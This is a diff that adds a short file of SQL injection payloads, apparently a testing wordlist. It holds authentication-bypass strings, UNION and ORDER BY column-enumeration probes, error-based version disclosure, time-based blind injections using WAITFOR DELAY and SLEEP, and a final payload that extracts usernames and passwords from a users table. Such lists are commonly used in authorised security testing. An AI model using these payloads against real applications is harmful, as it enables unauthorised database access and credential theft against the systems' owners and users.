@@ -1,0 +1,24 @@
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' /*
+admin' --
+admin' #
+' OR 1=1--
+') OR ('1'='1
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION ALL SELECT NULL--
+' AND '1'='1
+' AND '1'='2
+'; WAITFOR DELAY '0:0:5'--
+'; SELECT SLEEP(5)--
+' AND 1=CONVERT(int, (SELECT @@version))--
+"
+'
+';
+";
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' ORDER BY 3--
+1' UNION SELECT username, password FROM users--
